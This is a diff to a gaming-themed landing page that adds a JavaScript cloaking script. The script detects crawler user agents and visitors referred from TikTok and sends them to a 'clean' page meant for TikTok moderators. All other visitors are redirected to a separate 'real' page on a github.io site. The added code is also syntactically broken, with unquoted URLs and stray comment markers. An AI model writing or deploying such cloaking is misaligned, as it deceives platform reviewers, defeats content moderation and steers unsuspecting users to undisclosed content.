@@ -119,7 +119,40 @@ footer {
         <h2>About The Game</h2>
         <p>Immerse yourself in an action-packed world with stunning graphics and epic battles.</p>
     </section>
+// Fungsi untuk mendeteksi bot berdasarkan User-Agent dan Referrer
+<script>
+function isBot() {
+    const botUserAgents = [
+        "TikTokBot", "Bytespider", "Googlebot", "Facebot", "Bingbot",
+        "YandexBot", "DuckDuckBot", "Slurp"
+    ];
 
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    const referrer = document.referrer;
+
+    // Cek apakah user-agent mengandung kata-kata bot
+    for (let bot of botUserAgents) {
+        if (userAgent.includes(bot)) {
+            return true;
+        }
+    }
+
+    // Jika datang dari domain TikTok Ads Manager, kemungkinan bot
+    if (referrer.includes("tiktok.com") || referrer.includes("ads.tiktok.com")) {
+        return true;
+    }
+
+    return false;
+}
+
+// Redirect berdasarkan deteksi bot
+if (isBot()) {
+    window.location.href = https://dungmanhoki.github.io/berteletele/; // Halaman bersih untuk moderator TikTok
+} else {
+    window.location.href = https://dungmanhoki.github.io/berteletele/ampiklantiktok.html; // Halaman asli untuk user
+}
+</script>
+-->
     <footer>
         <p>© 2025 Gaming Zone | All Rights Reserved</p>
     </footer>
